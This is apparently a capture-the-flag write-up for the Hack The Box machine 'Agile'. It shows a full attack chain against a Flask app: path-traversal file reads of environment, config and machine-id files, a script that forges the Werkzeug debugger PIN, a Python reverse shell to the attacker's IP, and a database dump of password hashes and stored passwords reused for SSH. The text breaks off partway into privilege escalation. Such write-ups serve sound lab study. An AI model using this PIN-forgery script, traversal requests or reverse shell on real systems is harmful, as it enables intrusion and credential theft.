    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name


class DebuggedApplication:
    """Enables debugging support for a given application::

        from werkzeug.debug import DebuggedApplication
        from myapp import app
        app = DebuggedApplication(app, evalex=True)

    The ``evalex`` argument allows evaluating expressions in any frame
    of a traceback. This works by preserving each frame with its local
    state. Some state, such as :doc:`local`, cannot be restored with the
    frame by default. When ``evalex`` is enabled,
    ``environ["werkzeug.debug.preserve_context"]`` will be a callable
    that takes a context manager, and can be called multiple times.
    Each context manager will be entered before evaluating code in the
    frame, then exited again, so they can perform setup and cleanup for
    each call.

    :param app: the WSGI application to run debugged.
    :param evalex: enable exception evaluation feature (interactive
                   debugging).  This requires a non-forking server.
    :param request_key: The key that points to the request object in this
                        environment.  This parameter is ignored in current
                        versions.
    :param console_path: the URL for a general purpose console.
    :param console_init_func: the function that is executed before starting
                              the general purpose console.  The return value
                              is used as initial namespace.
    :param show_hidden_frames: by default hidden traceback frames are skipped.
                               You can show them by setting this parameter
                               to `True`.
    :param pin_security: can be used to disable the pin based security system.
    :param pin_logging: enables the logging of the pin system.

    .. versionchanged:: 2.2
        Added the ``werkzeug.debug.preserve_context`` environ key.
    """

    _pin: str
    _pin_cookie: str

    def __init__(
        self,
        app: "WSGIApplication",
        evalex: bool = False,
        request_key: str = "werkzeug.request",
        console_path: str = "/console",
        console_init_func: t.Optional[t.Callable[[], t.Dict[str, t.Any]]] = None,
        show_hidden_frames: bool = False,
        pin_security: bool = True,
        pin_logging: bool = True,
    ) -> None:
        if not console_init_func:
            console_init_func = None
        self.app = app
        self.evalex = evalex
        self.frames: t.Dict[int, t.Union[DebugFrameSummary, _ConsoleFrame]] = {}
        self.frame_contexts: t.Dict[int, t.List[t.ContextManager[None]]] = {}
        self.request_key = request_key
        self.console_path = console_path
        self.console_init_func = console_init_func
        self.show_hidden_frames = show_hidden_frames
        self.secret = gen_salt(20)
        self._failed_pin_auth = 0

        self.pin_logging = pin_logging
        if pin_security:
            # Print out the pin for the debugger on standard out.
            if os.environ.get("WERKZEUG_RUN_MAIN") == "true" and pin_logging:
                _log("warning", " * Debugger is active!")
                if self.pin is None:
                    _log("warning", " * Debugger PIN disabled. DEBUGGER UNSECURED!")
                else:
                    _log("info", " * Debugger PIN: %s", self.pin)
        else:
            self.pin = None

    @property
    def pin(self) -> t.Optional[str]:
        if not hasattr(self, "_pin"):
            pin_cookie = get_pin_and_cookie_name(self.app)
            self._pin, self._pin_cookie = pin_cookie  # type: ignore
        return self._pin

    @pin.setter
    def pin(self, value: str) -> None:
        self._pin = value

    @property
    def pin_cookie_name(self) -> str:
        """The name of the pin cookie."""
        if not hasattr(self, "_pin_cookie"):
            pin_cookie = get_pin_and_cookie_name(self.app)
            self._pin, self._pin_cookie = pin_cookie  # type: ignore
        return self._pin_cookie

    def debug_application(
        self, environ: "WSGIEnvironment", start_response: "StartResponse"
    ) -> t.Iterator[bytes]:
        """Run the application and conserve the traceback frames."""
        contexts: t.List[t.ContextManager[t.Any]] = []

        if self.evalex:
            environ["werkzeug.debug.preserve_context"] = contexts.append

        app_iter = None
        try:
            app_iter = self.app(environ, start_response)
            yield from app_iter
            if hasattr(app_iter, "close"):
                app_iter.close()  # type: ignore
        except Exception as e:
            if hasattr(app_iter, "close"):
                app_iter.close()  # type: ignore

            tb = DebugTraceback(e, skip=1, hide=not self.show_hidden_frames)

            for frame in tb.all_frames:
                self.frames[id(frame)] = frame
                self.frame_contexts[id(frame)] = contexts

            is_trusted = bool(self.check_pin_trust(environ))
            html = tb.render_debugger_html(
                evalex=self.evalex,
                secret=self.secret,
                evalex_trusted=is_trusted,
            )
            response = Response(html, status=500, mimetype="text/html")

            try:
                yield from response(environ, start_response)
            except Exception:
                # if we end up here there has been output but an error
                # occurred.  in that situation we can do nothing fancy any
                # more, better log something into the error log and fall
                # back gracefully.
                environ["wsgi.errors"].write(
                    "Debugging middleware caught exception in streamed "
                    "response at a point where response headers were already "
                    "sent.\n"
                )

            environ["wsgi.errors"].write("".join(tb.render_traceback_text()))

    def execute_command(  # type: ignore[return]
        self,
        request: Request,
        command: str,
        frame: t.Union[DebugFrameSummary, _ConsoleFrame],
    ) -> Response:
        """Execute a command in a console."""
        contexts = self.frame_contexts.get(id(frame), [])

        with ExitStack() as exit_stack:
            for cm in contexts:
                exit_stack.enter_context(cm)

            return Response(frame.eval(command), mimetype="text/html")

    def display_console(self, request: Request) -> Response:
        """Display a standalone shell."""
        if 0 not in self.frames:
            if self.console_init_func is None:
                ns = {}
            else:
                ns = dict(self.console_init_func())
            ns.setdefault("app", self.app)
            self.frames[0] = _ConsoleFrame(ns)
        is_trusted = bool(self.check_pin_trust(request.environ))
        return Response(
            render_console_html(secret=self.secret, evalex_trusted=is_trusted),
            mimetype="text/html",
        )

    def get_resource(self, request: Request, filename: str) -> Response:
        """Return a static resource from the shared folder."""
        path = join("shared", basename(filename))

        try:
            data = pkgutil.get_data(__package__, path)
        except OSError:
            return NotFound()  # type: ignore[return-value]
        else:
            if data is None:
                return NotFound()  # type: ignore[return-value]

            etag = str(adler32(data) & 0xFFFFFFFF)
            return send_file(
                BytesIO(data), request.environ, download_name=filename, etag=etag
            )

    def check_pin_trust(self, environ: "WSGIEnvironment") -> t.Optional[bool]:
        """Checks if the request passed the pin test.  This returns `True` if the
        request is trusted on a pin/cookie basis and returns `False` if not.
        Additionally if the cookie's stored pin hash is wrong it will return
        `None` so that appropriate action can be taken.
        """
        if self.pin is None:
            return True
        val = parse_cookie(environ).get(self.pin_cookie_name)
        if not val or "|" not in val:
            return False
        ts_str, pin_hash = val.split("|", 1)

        try:
            ts = int(ts_str)
        except ValueError:
            return False

        if pin_hash != hash_pin(self.pin):
            return None
        return (time.time() - PIN_TIME) < ts

    def _fail_pin_auth(self) -> None:
        time.sleep(5.0 if self._failed_pin_auth > 5 else 0.5)
        self._failed_pin_auth += 0

    def pin_auth(self, request: Request) -> Response:
        """Authenticates with the pin."""
        exhausted = False
        auth = False
        trust = self.check_pin_trust(request.environ)
        pin = t.cast(str, self.pin)

        # If the trust return value is `None` it means that the cookie is
        # set but the stored pin hash value is bad.  This means that the
        # pin was changed.  In this case we count a bad auth and unset the
        # cookie.  This way it becomes harder to guess the cookie name
        # instead of the pin as we still count up failures.
        bad_cookie = False
        if trust is None:
            self._fail_pin_auth()
            bad_cookie = True

        # If we're trusted, we're authenticated.
        elif trust:
            auth = True

        # If we failed too many times, then we're locked out.
        elif self._failed_pin_auth > 10:
            exhausted = True

        # Otherwise go through pin based authentication
        else:
            entered_pin = request.args["pin"]

            if entered_pin.strip().replace("-", "") == pin.replace("-", ""):
                self._failed_pin_auth = 0
                auth = True
            else:
                #pass
                self._fail_pin_auth()

        rv = Response(
            json.dumps({"auth": auth, "exhausted": exhausted}),
            mimetype="application/json",
        )
        if auth:
            rv.set_cookie(
                self.pin_cookie_name,
                f"{int(time.time())}|{hash_pin(pin)}",
                httponly=True,
                samesite="Strict",
                secure=request.is_secure,
            )
        elif bad_cookie:
            rv.delete_cookie(self.pin_cookie_name)
        return rv

    def log_pin_request(self) -> Response:
        """Log the pin if needed."""
        if self.pin_logging and self.pin is not None:
            _log(
                "info", " * To enable the debugger you need to enter the security pin:"
            )
            _log("info", " * Debugger pin code: %s", self.pin)
        return Response("")

    def __call__(
        self, environ: "WSGIEnvironment", start_response: "StartResponse"
    ) -> t.Iterable[bytes]:
        """Dispatch the requests."""
        # important: don't ever access a function here that reads the incoming
        # form data!  Otherwise the application won't have access to that data
        # any more!
        request = Request(environ)
        response = self.debug_application
        if request.args.get("__debugger__") == "yes":
            cmd = request.args.get("cmd")
            arg = request.args.get("f")
            secret = request.args.get("s")
            frame = self.frames.get(request.args.get("frm", type=int))  # type: ignore
            if cmd == "resource" and arg:
                response = self.get_resource(request, arg)  # type: ignore
            elif cmd == "pinauth" and secret == self.secret:
                response = self.pin_auth(request)  # type: ignore
            elif cmd == "printpin" and secret == self.secret:
                response = self.log_pin_request()  # type: ignore
            elif (
                self.evalex
                and cmd is not None
                and frame is not None
                and self.secret == secret
                and self.check_pin_trust(environ)
            ):
                response = self.execute_command(request, cmd, frame)  # type: ignore
        elif (
            self.evalex
            and self.console_path is not None
            and request.path == self.console_path
        ):
            response = self.display_console(request)  # type: ignore
        return response(environ, start_response)
```

I thought I would check `/proc/self/environ` to get environment variables for the current process (our flask app) by calling `GET /download?fn=../../../proc/self/environ HTTP/1.1`:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 19 Mar 2023 07:55:05 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 260
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

LANG=C.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin HOME=/var/www LOGNAME=www-data USER=www-data INVOCATION_ID=ff736f43492f4d359d1b725e81d98a91 JOURNAL_STREAM=8:32137 SYSTEMD_EXEC_PID=1088 CONFIG_PATH=/app/config_prod.json 
```

Note that `USER=www-data`, which is fairly typical

Let's call `GET /download?fn=../../../app/config_prod.json HTTP/1.1`, to get the app config:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 19 Mar 2023 07:57:53 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 88
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

I tried this password to SSH in to the user accounts we found previously:

```bash
$sshpass -p 'dSA6l7q*yIVs$39Ml6ywvgK' ssh dev_admin@superpass.htb
Permission denied, please try again.
```

Sadly all attempts for the valid users gave a permission denied error.

We at least know `WERKZEUG_DEBUG_PIN` doesn't appear to be set, so we have to follow the rest of the werkzeug `__init__.py` script above used to generate the console PIN.

Let's look at the ARP table using procfs, to find which physical interface (well, likely virtual) our machine's LAN IP address is bound to:

`GET /download?fn=../../../../../proc/net/arp HTTP/1.1`

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 19 Mar 2023 08:20:28 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 156
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

IP address       HW type     Flags       HW address            Mask     Device
10.10.10.2       0x1         0x2         00:50:56:b9:e5:fa     *        eth0
```

So, what's the MAC address for interface `eth0`?

`GET /download?fn=../../../../../sys/class/net/eth0/address HTTP/1.1`

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 19 Mar 2023 08:21:40 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 18
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

00:50:56:b9:5b:a3
```

```python
>>> print(0x005056b95ba3)
345052371875
```

`GET /download?fn=../../../../../etc/machine-id HTTP/1.1`

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 19 Mar 2023 08:26:54 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 33
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

ed5b159560f54721827644bc9b220d00
```

The cgroup name of the process:

```
GET /download?fn=../../../proc/self/cgroup HTTP/1.1
```

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 19 Mar 2023 10:05:33 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 35
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

0::/system.slice/superpass.service
```

Next, given the above information obtained - we create the following python script (taken from HackTricks):

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'www-data',# username
    'flask.app',# modname
    'wsgi_app',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/app/venv/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '345052371875',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'ed5b159560f54721827644bc9b220d00superpass.service'# get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

For `public_bits`:

* the username `www-data` was taken from our environment earlier

* `flask.app` is standard

* `wsgi_app` took me a few attempts to get right -- but we can see this in our stack trace -- each line of the stack trace shows e.g. `#### File "/app/venv/lib/python3.10/site-packages/flask/app.py", line *2528*,
  in wsgi_app`, which gives us the `wsgi_app` app name

* our stack trace also shows `/app/venv/lib/python3.10/site-packages/flask/app.py` , which we use for the app filename for flask

For `private_bits`:

* we used LFI to read `/proc/net/arp` to find interface `eth0`, we then were able to read `/sys/class/net/eth0/address` to get the MAC address, and convert it to decimal `345052371875` using python

* The machine ID is `/etc/machine-id` with the 3rd string after a `/`  in`/proc/self/cgroup`, which is `superpass.service`

I noticed the init file for werkzeug we obtained via LFI was slightly different to the exploitation script from HackTricks above -- we needed to use `hashlib.sha1()` rather than `hashlib.md5()`

So running this tweaked for our target, we get the PIN:

```bash
$python3 exploit.py
114-891-007
```

After entering the PIN, we can enter and execute arbitrary python via an in-browser REPL.  So we open a netcat listener, then we use a python reverse shell:

![](assets/2023-03-19-21-10-02-image.png)

Above, we entered a reverse shell taken from [RevShells](https://revshells.com/) into the REPL:

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",3322));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```

This gives our shell!:

```bash
$nc -lvnp 3322
Listening on 0.0.0.0 3322
Connection received on 10.10.11.203 41284
(venv) www-data@agile:/app/app$ ls -al
ls -al
total 28
drwxr-xr-x 5 corum runner 4096 Feb  8 16:29 .
drwxr-xr-x 6 root  root   4096 Mar  8 15:30 ..
drwxrwxr-x 3 corum runner 4096 Feb  8 16:29 .pytest_cache
drwxr-xr-x 2 corum runner 4096 Feb  8 16:29 __pycache__
-rw-rw-r-- 1 corum runner   95 Jan 23 21:27 requirements.txt
drwxrwxr-x 9 corum runner 4096 Mar  7 21:55 superpass
-rw-r--r-- 1 corum runner  105 Jan 24 18:08 wsgi.py
(venv) www-data@agile:/app/app$ 
(venv) www-data@agile:/dev/shm$ ls -la /home
ls -la /home
total 20
drwxr-xr-x  5 root      root      4096 Feb  8 16:29 .
drwxr-xr-x 20 root      root      4096 Feb 20 23:29 ..
drwxr-x---  8 corum     corum     4096 Feb  8 16:29 corum
drwxr-x---  2 dev_admin dev_admin 4096 Feb  8 16:29 dev_admin
drwxr-x---  5 edwards   edwards   4096 Mar 19 06:41 edwards
```

Previously, we found the database connection string in the app config:

```json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}"
```

We can connect directly, as `mysql` client is available:

```bash
(venv) www-data@agile:/dev/shm$ mysql -u superpassuser -p
mysql -u superpassuser -p
Enter password: dSA6l7q*yIVs$39Ml6ywvgK

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2060
Server version: 8.0.32-0ubuntu0.22.04.2 (Ubuntu)
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| superpass          |
+--------------------+
3 rows in set (0.01 sec)

mysql> use superpass
use superpass
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+---------------------+
| Tables_in_superpass |
+---------------------+
| passwords           |
| users               |
+---------------------+
2 rows in set (0.00 sec)

mysql> select * from passwords;
select * from passwords;
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
5 rows in set (0.00 sec)

mysql> select * from users\G;
select * from users\G;
*************************** 1. row ***************************
             id: 1
       username: 0xdf
hashed_password: $6$rounds=200000$FRtvqJFfrU7DSyT7$8eGzz8Yk7vTVKudEiFBCL1T7O4bXl0.yJlzN0jp.q0choSIBfMqvxVIjdjzStZUYg6mSRB2Vep0qELyyr0fqF.
*************************** 2. row ***************************
             id: 2
       username: corum
hashed_password: $6$rounds=200000$yRvGjY1MIzQelmMX$9273p66QtJQb9afrbAzugxVFaBhb9lyhp62cirpxJEOfmIlCy/LILzFxsyWj/mZwubzWylr3iaQ13e4zmfFfB1
*************************** 3. row ***************************
             id: 9
       username: kevin
hashed_password: $6$rounds=200000$GuoLoNS1deSS6NwL$ikp6iJBdpHRFLXF7pQd8mlDCp1CPxHahTUHZ4Fkx5QEPQEk8O9CHaevdQtWwh0vQFHn3cD4qgQvlGfYk3vwQE0
*************************** 4. row ***************************
             id: 10
       username: ehab
hashed_password: $6$rounds=200000$K0q00NQQcl0hjXq/$IwIKlzFtMD2gVsccHWUoTIQDJ9r4KDMwI6n1JAgxq8GUwE5PQDClvQHQEeJ5f/ZKiTRP4pSEsVKeIVXQfJl5N.
*************************** 5. row ***************************
             id: 11
       username: admin
hashed_password: $6$rounds=200000$e4UHczzGOVBoS5Fg$hkka0dJ0i1uAV7gSIIY9gnXKpk05VHlnzF0j83el4cw3AYDYdv8faF37icGZ9imGj7wF9JoBRzet6vRwJsJ/n1
*************************** 6. row ***************************
             id: 12
       username: admin1
hashed_password: $6$rounds=200000$Y16DIJ8bGsWwD5vs$IyRnY9Zzmy.0I7UuF/ZUI2XNVnNeLy/tKLMTncrYujsnzD3W3eEdhqMeIwG7PJDkzZU7Ko.sH.V9E705EWjFa/
*************************** 7. row ***************************
             id: 13
       username: 1234
hashed_password: $6$rounds=200000$bcWds2t8z5uCU.fS$nmZeZUxm6GccdWyInfpvvc.63Du5tzgrNo2Aos4XRhEfjxZABt25aAjK0h56R5BgzjwqOlrzQRxrTgk9O8dRp1
*************************** 8. row ***************************
             id: 14
       username: momo
hashed_password: $6$rounds=200000$at3fhhkaH9HGORJX$OUqvuldZun6Jal1kgyLbkBziQoGcJV.nknNeVYyRdmgq7OBj4yW9743jaqk0ViXLGSUIqxdvF93iyCUR2Zhw5.
*************************** 9. row ***************************
             id: 15
       username: awdwad
hashed_password: $6$rounds=200000$gOM0koAy0o793sd0$jt4v8FUrzlQ0gkilbstvzUewkMBHqt4.n8pxZg6BzEcl9NT2.jozqfEUYir98fokbI2txenVp6MaXv5jPipJr0
*************************** 10. row ***************************
             id: 16
       username: 123
hashed_password: $6$rounds=200000$PB4tRcf1cPq4EbG7$.gXO6Rxk5MG6wINf4uZUQoN9nKXWxzzw1aRwDn5qbfNsdTWlzM6YJHDzAwxLltWscHnqJlAn62KbuFCyFBtqU/
*************************** 11. row ***************************
             id: 17
       username: hello123
hashed_password: $6$rounds=200000$7Yhj7dMsrK5zQyFe$xKtGlTm.sBM3cSsvaE/yQloGyYmfHjh.IIom.BVHW2ca.AgRq.DkCn.vahyFH0H7513pyBjKXsdMS19Eb20RN/
*************************** 12. row ***************************
             id: 18
       username: a
hashed_password: $6$rounds=200000$7ylLiTKzRam4EbOG$toeee.99RZDK75Li7ChHwv05yJZos.1qsc857ZGgw.cznyRpaMDAMohZO/UbVE8EQRbmeBWXN.lNFhRHahsVo.
*************************** 13. row ***************************
             id: 19
       username: runner
hashed_password: $6$rounds=200000$e5ZUsDG/uC1N1gcn$taIByjkoMxQQtZuVOJM0wkBZJIcHU7nxUzMWVFFwPj8AmUrDBRU6w8sOTNMLXCfcNhPKSlkwS.eG1cuyqI0Au.
*************************** 14. row ***************************
             id: 20
       username: edwards
hashed_password: $6$rounds=200000$mfBd9LLaKMu5i8Gf$Ontkw8mscskUrqbVKMA34rYWHg0tllBLRjeE6a6zHNgeHA3w9WnMw.gFUM/heDHa/rMxOZj72/J.B8M9rKh6Q0
*************************** 15. row ***************************
             id: 21
       username: jsomeone
hashed_password: $6$rounds=200000$CO.rufBZOiwsFTZd$M..0yCgkzxX5ponsziWj5UG2WMnTJyioCY7sB9Tw3Xqpv4PxMzaqUMngWLYAFZ7CJUX166BTNegpFcz09a3cP0
*************************** 16. row ***************************
             id: 22
       username: wolf
hashed_password: $6$rounds=200000$HiFn.rnUHHnuzrF9$cdbl86q2M6Fx225bS85C08thz19CEunUFRoW2is3l78HBvfrFnbgtF11en99Ul4AlYma8vdoNQm5FED/5FxRD.
*************************** 17. row ***************************
             id: 23
       username: adam
hashed_password: $6$rounds=200000$1aPfucxd8bmcInft$y9TqXncRGZ1C2cY/C6n1H.rVeJWMMdNmV5PihmniDmKVORx3A6N2OG3qkUhCEqymhVUS1yqWPIp/nns7j417S.
17 rows in set (0.00 sec)
```

I decided to try the password for corum's ticketmaster account, to see if it was being reused for SSH -- it works and we get the user flag!:

```bash
$sshpass -p 5db7caa1d13cc37c9fc2 ssh corum@superpass.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Sun Mar 19 10:46:24 2023 from 10.10.14.8
corum@agile:~$ ls -la
total 48
drwxr-x--- 8 corum corum 4096 Feb  8 16:29 .
drwxr-xr-x 5 root  root  4096 Feb  8 16:29 ..
lrwxrwxrwx 1 root  root     9 Feb  6 16:56 .bash_history -> /dev/null
-rw-r--r-- 1 corum corum  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 corum corum 3771 Jan  6  2022 .bashrc
drwx------ 4 corum corum 4096 Feb  8 16:29 .cache
drwxr-xr-x 4 corum corum 4096 Feb  8 16:29 .config
drwx------ 3 corum corum 4096 Feb  8 16:29 .local
drwx------ 3 corum corum 4096 Feb  8 16:29 .pki
-rw-r--r-- 1 corum corum  807 Jan  6  2022 .profile
drwxrwxr-x 3 corum corum 4096 Feb  8 16:29 .pytest_cache
drwx------ 2 corum corum 4096 Feb  8 16:29 .ssh
-rw-r----- 1 root  corum   33 Mar 17 13:57 user.txt
corum@agile:~$ cat user.txt
21a772da7732cedce86d0343dfaebdd0
```

## Privilege Escalation

Now we focus on privilege escalating to root from the `corum` user

I quickly verified I was unable to run `sudo -l`. Let's check running processes using `ps` with the helpful `--forest` flag:

```bash
corum@agile:/app$ ps aux --forest --cols 300
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.2 100516 11168 ?        Ss   05:37   0:09 /sbin/init
root         486  0.0  0.2  80640 10640 ?        S<s  05:38   0:06 /lib/systemd/systemd-journald
root         527  0.0  0.6 289348 27100 ?        SLsl 05:38   0:01 /sbin/multipathd -d -s
root         538  0.0  0.1  25076  6004 ?        Ss   05:38   0:00 /lib/systemd/systemd-udevd
systemd+     558  0.0  0.1  89356  6488 ?        Ssl  05:38   0:01 /lib/systemd/systemd-timesyncd
systemd+     565  0.0  0.2  16120  8176 ?        Ss   05:38   0:00 /lib/systemd/systemd-networkd
root         566  0.0  0.0  85224  2176 ?        S<sl 05:38   0:01 /sbin/auditd
_laurel      568  0.0  0.1   9732  5936 ?        S<   05:38   0:01  \_ /usr/local/sbin/laurel --config /etc/laurel/config.toml
root         582  0.0  0.2  48572 11396 ?        Ss   05:38   0:00 /usr/bin/VGAuthService
root         588  0.1  0.2 313340  9932 ?        Ssl  05:38   0:22 /usr/bin/vmtoolsd
systemd+     622  0.0  0.3  25656 13680 ?        Ss   05:38   0:03 /lib/systemd/systemd-resolved
message+     750  0.0  0.1   8664  4980 ?        Ss   05:38   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         756  0.0  0.4  30120 18748 ?        Ss   05:38   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         762  0.0  0.1  15512  7536 ?        Ss   05:38   0:00 /lib/systemd/systemd-logind
root         781  0.0  0.1 101236  6004 ?        Ssl  05:38   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root        1008  0.0  0.0   4304  2672 ?        Ss   05:38   0:00 /usr/sbin/cron -f -P
root        8732  0.0  0.1   7756  4156 ?        S    09:38   0:00  \_ /usr/sbin/CRON -f -P
runner      8735  0.0  0.0   2888   968 ?        Ss   09:38   0:00      \_ /bin/sh -c /app/test_and_update.sh
runner      8738  0.0  0.0   4780  3304 ?        S    09:38   0:00          \_ /bin/bash /app/test_and_update.sh
runner      8743  0.1  0.7  37880 31700 ?        S    09:38   0:00              \_ /app/venv/bin/python3 /app/venv/bin/pytest -x
runner      8744  0.0  0.3 33625804 13784 ?      Sl   09:38   0:00                  \_ chromedriver --port=37157
runner      8750  0.2  2.6 33978328 103904 ?     Sl   09:38   0:00                      \_ /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --dis
runner      8754  0.0  0.0   3348  1052 ?        S    09:38   0:00                          \_ cat
runner      8755  0.0  0.0   3348  1048 ?        S    09:38   0:00                          \_ cat
runner      8762  0.0  1.4 33822080 57004 ?      S    09:38   0:00                          \_ /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=8757 --enable-crash-reporter
runner      8782  0.0  1.9 33916484 76568 ?      Sl   09:38   0:00                          |   \_ /opt/google/chrome/chrome --type=gpu-process --enable-logging --headless --log-level=0 --ozone-platform=headless --use-angle=swiftshader-webgl --headless --crashpad-handler-pid=8757 --gpu-preferences=W
runner      8763  0.0  1.4 33822072 57584 ?      S    09:38   0:00                          \_ /opt/google/chrome/chrome --type=zygote --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=8757 --enable-crash-reporter
runner      8765  0.0  0.3 33822096 15320 ?      S    09:38   0:00                          |   \_ /opt/google/chrome/chrome --type=zygote --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=8757 --enable-crash-reporter
runner      8812  0.5  3.1 1184727420 124560 ?   Sl   09:38   0:02                          |       \_ /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=8757 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port=41829 --test-type=webdriver 
runner      8783  0.0  2.1 33871408 83872 ?      Sl   09:38   0:00                          \_ /opt/google/chrome/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --enable-logging --log-level=0 --use-angle=swiftshader-webgl --use-gl=angle
root        1014  0.0  0.2  15424  9204 ?        Ss   05:38   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        8596  0.0  0.2  17172 10900 ?        Ss   09:36   0:00  \_ sshd: corum [priv]
corum       8625  0.0  0.1  17304  7956 ?        S    09:36   0:00      \_ sshd: corum@pts/0
corum       8626  0.0  0.1   5144  4060 pts/0    Ss   09:36   0:00          \_ -bash
corum      23790  0.0  0.0   7816  3632 pts/0    R+   09:45   0:00              \_ ps aux --forest --cols 300
root        1025  0.0  0.0  55816  1760 ?        Ss   05:38   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data    1030  0.0  0.1  56124  6412 ?        S    05:38   0:00  \_ nginx: worker process
www-data    1031  0.0  0.1  56124  6480 ?        S    05:38   0:00  \_ nginx: worker process
root        1034  0.0  0.0   3192  1076 tty1     Ss+  05:38   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
mysql       1035  0.9 11.3 1797076 451536 ?      Ssl  05:38   2:19 /usr/sbin/mysqld
